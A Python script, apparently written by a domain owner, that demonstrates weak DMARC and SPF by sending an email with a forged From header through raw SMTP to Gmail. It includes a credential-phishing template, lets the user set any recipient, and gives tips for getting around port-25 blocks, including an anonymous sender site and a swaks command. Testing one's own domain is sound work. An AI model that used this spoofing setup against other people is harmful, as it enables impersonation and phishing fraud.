#!/usr/bin/env python3
"""
spoof_test.py — Send a spoofed email to demonstrate weak DMARC/SPF.

This does exactly what an attacker would do:
  1. Look up Gmail's MX server via DNS
  2. Connect directly to it on port 25 (raw SMTP, no authentication)
  3. Send an email with a spoofed From: header (@rvuwallet.com)

YOU own rvuwallet.com and are sending to YOUR OWN Gmail. This is a
legitimate security test of your own domain's email configuration.

Usage:
    python3 spoof_test.py              # dry run (shows what would be sent)
    python3 spoof_test.py --send       # actually send the spoofed email
"""

import smtplib
import socket
import subprocess
import sys
import textwrap
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timezone

# ── Config ──────────────────────────────────────────────────────────
SPOOFED_FROM    = "support@rvuwallet.com"          # what the victim sees
ENVELOPE_FROM   = "test-bounce@rvuwallet.com"      # Return-Path (for SPF check)
# Allow overriding recipient: python3 spoof_test.py --send someone@example.com
_custom = [a for a in sys.argv[1:] if "@" in a and not a.startswith("-")]
RECIPIENT       = _custom[0] if _custom else "carlos.a.rodriguez100@gmail.com"
SUBJECT         = "[SECURITY TEST] Verify your RVU Wallet account"
BODY_HTML = """\
<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
  <div style="background: #1a1a2e; padding: 20px; text-align: center;">
    <h1 style="color: #e94560; margin: 0;">RVU Wallet</h1>
  </div>
  <div style="padding: 20px; background: #f5f5f5;">
    <p>Dear Customer,</p>
    <p>We detected unusual activity on your RVU Wallet account.
       Please verify your identity immediately to avoid account suspension.</p>
    <p style="text-align: center; margin: 24px 0;">
      <a href="https://example.com/this-is-a-test-not-real"
         style="background: #e94560; color: white; padding: 12px 32px;
                text-decoration: none; border-radius: 6px; font-weight: bold;">
        Verify Account
      </a>
    </p>
    <p style="font-size: 12px; color: #999;">
      If you did not request this, please ignore this email.<br>
      &mdash; RVU Wallet Security Team
    </p>
  </div>
  <div style="padding: 10px; text-align: center; font-size: 11px; color: #aaa; background: #1a1a2e;">
    <p style="color: #e94560; font-weight: bold;">
      ⚠️ THIS IS A SECURITY TEST — sent by the domain owner to demonstrate
      that rvuwallet.com's DMARC (p=none) and SPF (~all) allow spoofing.
    </p>
  </div>
</div>
"""

BODY_TEXT = textwrap.dedent("""\
    [SECURITY TEST — Spoofed Email from rvuwallet.com]

    This email was sent by the domain owner to demonstrate that
    rvuwallet.com's current DMARC (p=none) and SPF (~all) configuration
    allows anyone to send emails that appear to come from @rvuwallet.com.

    An attacker could replace this with a phishing link.

    Check "Show Original" in Gmail to see:
      - SPF: softfail (sender IP is not authorized)
      - DKIM: fail or none (no valid signature)
      - DMARC: fail (but p=none means Gmail delivered it anyway)
""")

# ── Colors ──────────────────────────────────────────────────────────
C = "\033[96m"; G = "\033[92m"; Y = "\033[93m"; R = "\033[91m"
B = "\033[1m"; D = "\033[2m"; RST = "\033[0m"

SEND_MODE = "--send" in sys.argv

# ── Step 1: Resolve Gmail MX ───────────────────────────────────────
def get_mx(domain):
    """Look up MX records for a domain."""
    print(f"\n{C}{B}Step 1:{RST} DNS MX lookup for {domain}")
    try:
        result = subprocess.run(
            ["dig", "+short", "MX", domain],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            records = []
            for line in result.stdout.strip().split("\n"):
                parts = line.strip().split()
                if len(parts) == 2:
                    pri, host = int(parts[0]), parts[1].rstrip(".")
                    records.append((pri, host))
                    print(f"  {D}│{RST} priority {pri}: {host}")
            records.sort()
            best = records[0][1]
            print(f"  {G}✓ Using: {best} (lowest priority = preferred){RST}")
            return best
    except Exception as e:
        print(f"  {R}dig failed: {e}{RST}")

    # Fallback
    fallback = "gmail-smtp-in.l.google.com"
    print(f"  {Y}Using fallback: {fallback}{RST}")
    return fallback

# ── Step 2: Build the spoofed message ──────────────────────────────
def build_message():
    print(f"\n{C}{B}Step 2:{RST} Building spoofed email")

    msg = MIMEMultipart("alternative")
    msg["From"]    = f"RVU Wallet Support <{SPOOFED_FROM}>"
    msg["To"]      = RECIPIENT
    msg["Subject"] = SUBJECT
    msg["Date"]    = datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S +0000")
    msg["Message-ID"] = f"<spoof-test-{int(datetime.now().timestamp())}@rvuwallet.com>"

    msg.attach(MIMEText(BODY_TEXT, "plain"))
    msg.attach(MIMEText(BODY_HTML, "html"))

    print(f"  {D}│{RST} From header:    {R}{SPOOFED_FROM}{RST}  (spoofed!)")
    print(f"  {D}│{RST} Envelope from:  {R}{ENVELOPE_FROM}{RST}")
    print(f"  {D}│{RST} To:             {RECIPIENT}")
    print(f"  {D}│{RST} Subject:        {SUBJECT}")
    print(f"  {D}│{RST} Content:        HTML phishing template + plaintext fallback")

    return msg

# ── Step 3: Show what happens at each auth check ───────────────────
def explain_auth():
    print(f"\n{C}{B}Step 3:{RST} What the receiving server will check")
    print(f"""
  {Y}SPF:{RST}  Checks if YOUR IP is in rvuwallet.com's SPF record.
  {D}│{RST}     Your IP is NOT listed → {Y}SOFTFAIL{RST} (because ~all, not -all)
  {D}│{RST}     With -all it would be a {R}HARDFAIL{RST} and likely rejected.

  {Y}DKIM:{RST} Checks for a valid rvuwallet.com DKIM signature.
  {D}│{RST}     You don't have the private key → {R}FAIL / NONE{RST}

  {Y}DMARC:{RST} Checks if SPF or DKIM aligns with From: header domain.
  {D}│{RST}     SPF alignment: FAIL  (envelope ≠ From, and softfail anyway)
  {D}│{RST}     DKIM alignment: FAIL (no valid sig)
  {D}│{RST}     DMARC verdict: {R}FAIL{RST}
  {D}│{RST}     But policy is {R}p=none{RST} → {Y}DELIVER ANYWAY{RST}
""")

# ── Step 4: Send (or dry run) ──────────────────────────────────────
def send_email(mx_host, msg):
    if not SEND_MODE:
        print(f"\n{C}{B}Step 4:{RST} DRY RUN (pass --send to actually send)")
        print(f"  {D}│{RST} Would connect to {mx_host}:25")
        print(f"  {D}│{RST} Would send MAIL FROM:<{ENVELOPE_FROM}>")
        print(f"  {D}│{RST} Would send RCPT TO:<{RECIPIENT}>")
        print(f"  {D}│{RST} Would deliver message with spoofed From: {SPOOFED_FROM}")
        print(f"\n  {Y}Run: python3 spoof_test.py --send{RST}")
        print(f"  {D}(to actually deliver the spoofed email to your inbox){RST}")
        return False

    print(f"\n{C}{B}Step 4:{RST} Connecting to {mx_host}:25 ...")

    try:
        # Check if port 25 is reachable
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        result = sock.connect_ex((mx_host, 25))
        sock.close()

        if result != 0:
            print(f"\n  {R}✗ Cannot connect to {mx_host}:25{RST}")
            print(f"  {Y}Port 25 is likely blocked by your ISP or network.{RST}")
            print(f"  {D}│{RST} Most residential ISPs and cloud providers block outbound")
            print(f"  {D}│{RST} port 25 to prevent spam. This is actually common.")
            print(f"\n  {B}Alternatives:{RST}")
            print(f"  {D}│{RST} 1. Run this from a VPS that allows port 25 (DigitalOcean, Vultr)")
            print(f"  {D}│{RST} 2. Use an online SMTP tester (mail-tester.com, mxtoolbox.com)")
            print(f"  {D}│{RST} 3. Use a service like smtp2go.com free tier as a relay")
            return False

        print(f"  {G}✓ Port 25 is open, connecting...{RST}")

        with smtplib.SMTP(mx_host, 25, timeout=30) as server:
            server.set_debuglevel(1)  # show the SMTP conversation
            print(f"\n  {D}── SMTP conversation ──{RST}")
            server.ehlo("security-test.local")

            # Try STARTTLS if available (Gmail supports it)
            if server.has_extn("STARTTLS"):
                server.starttls()
                server.ehlo("security-test.local")
                print(f"  {G}✓ STARTTLS established{RST}")

            server.mail(ENVELOPE_FROM)
            server.rcpt(RECIPIENT)
            server.data(msg.as_string().encode())
            print(f"\n  {G}{B}✓ EMAIL SENT SUCCESSFULLY{RST}")
            print(f"  {G}Check {RECIPIENT}'s inbox (or spam folder).{RST}")
            print(f"  {Y}Then click ⋮ → 'Show Original' to see the SPF/DKIM/DMARC results.{RST}")
            return True

    except smtplib.SMTPRecipientsRefused as e:
        print(f"\n  {R}✗ Recipient refused: {e}{RST}")
        print(f"  {D}The server rejected the recipient address.{RST}")
    except smtplib.SMTPSenderRefused as e:
        print(f"\n  {R}✗ Sender refused: {e}{RST}")
        print(f"  {D}The server rejected the envelope sender.{RST}")
    except smtplib.SMTPDataError as e:
        print(f"\n  {R}✗ Data error: {e}{RST}")
    except socket.timeout:
        print(f"\n  {R}✗ Connection timed out{RST}")
        print(f"  {Y}Port 25 may be blocked by your ISP.{RST}")
    except ConnectionRefusedError:
        print(f"\n  {R}✗ Connection refused on port 25{RST}")
        print(f"  {Y}Port 25 is blocked.{RST}")
    except Exception as e:
        print(f"\n  {R}✗ Error: {type(e).__name__}: {e}{RST}")

    return False

# ── Main ───────────────────────────────────────────────────────────
def main():
    print(f"\n{C}{'━' * 60}")
    print(f"  {B}Email Spoof Test: rvuwallet.com → Gmail{RST}{C}")
    print(f"{'━' * 60}{RST}")
    print(f"  Spoofed From:  {R}{SPOOFED_FROM}{RST}")
    print(f"  Envelope From: {R}{ENVELOPE_FROM}{RST}")
    print(f"  Recipient:     {RECIPIENT}")
    print(f"  Mode:          {'🔴 LIVE SEND' if SEND_MODE else '⚪ DRY RUN'}")

    rcpt_domain = RECIPIENT.split("@")[1]
    mx_host = get_mx(rcpt_domain)
    msg = build_message()
    explain_auth()
    sent = send_email(mx_host, msg)

    print(f"\n{C}{'━' * 60}{RST}")
    if sent:
        print(f"""
  {G}{B}What to do now:{RST}
  1. Open Gmail for {RECIPIENT}
  2. Look for the email from "RVU Wallet Support <{SPOOFED_FROM}>"
  3. Click ⋮ → "Show Original"
  4. Look at Authentication-Results:
     • SPF:   {Y}softfail{RST} (your IP isn't authorized)
     • DKIM:  {R}fail/none{RST} (no valid signature)
     • DMARC: {R}fail (p=NONE){RST} ← this is why it was delivered
  5. That's the proof. p=none + ~all = anyone can spoof your domain.
""")
    else:
        print(f"""
  {Y}{B}If port 25 is blocked:{RST}
  The easiest way to prove this is:

  {B}Option A:{RST} Use an online tool
    → Go to https://www.mail-tester.com or https://mxtoolbox.com/SuperTool.aspx
    → Or use https://emkei.cz (free anonymous email sender)
    → Send from: {SPOOFED_FROM}  →  To: {RECIPIENT}

  {B}Option B:{RST} Use a cheap VPS ($5/mo)
    → DigitalOcean, Vultr, or Linode
    → Copy this script there and run: python3 spoof_test.py --send
    → Port 25 is usually open on VPS providers

  {B}Option C:{RST} Use swaks (Swiss Army Knife for SMTP)
    → brew install swaks
    → swaks --to {RECIPIENT} \\
            --from {SPOOFED_FROM} \\
            --server gmail-smtp-in.l.google.com \\
            --header "Subject: [TEST] Spoofed from rvuwallet.com" \\
            --body "This is a spoof test. Check Show Original for auth results."

  Either way, the result is the same: DMARC=fail, p=none, delivered.
""")

if __name__ == "__main__":
    main()
